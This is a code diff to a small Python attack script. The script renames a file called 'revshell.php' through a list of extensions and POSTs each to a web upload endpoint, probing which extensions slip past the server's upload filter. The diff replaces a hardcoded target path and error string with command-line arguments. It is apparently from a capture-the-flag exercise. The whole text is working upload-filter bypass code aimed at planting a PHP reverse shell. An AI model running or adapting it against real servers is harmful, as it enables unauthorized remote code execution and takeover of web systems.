@@ -14,12 +14,12 @@ parser = argparse.ArgumentParser(
 
 parser.add_argument("-i", "--ip", dest="ip", help="Ip Address")
 parser.add_argument("-p", "--port", dest="port", help="Port Number")
-parser.add_argument("-s", "--sub-directory", dest="sub_directory", help="Sub-Directory")
-parser.add_argument("-e", "--error", dest="error", help="Error Message. >> What message should not happen?")
+parser.add_argument("-s", "--sub-directory", dest="sub_directory", help="Sub-Directory. >> internal/index.php")
+parser.add_argument("-e", "--error", dest="error", help="Error Message. >> What message should not happen? example: Extension not allowed")
 
 parser.parse_args()
 
-# url = f"http://{ip}:{port}/internal/index.php"
+# url = f"http://{ip}:{port}/{sub_directory}"
 
 old_filename = "revshell.php"
 
@@ -41,7 +41,7 @@ for ext in Array:
     files = {"file": open(new_filename, "rb")}
     r = requests.post(url, files=files)
 
-    if not "Extension not allowed" in r.text:
+    if not error in r.text:
         print(f"{ext} seems to be allowed")
 
     old_filename = new_filename
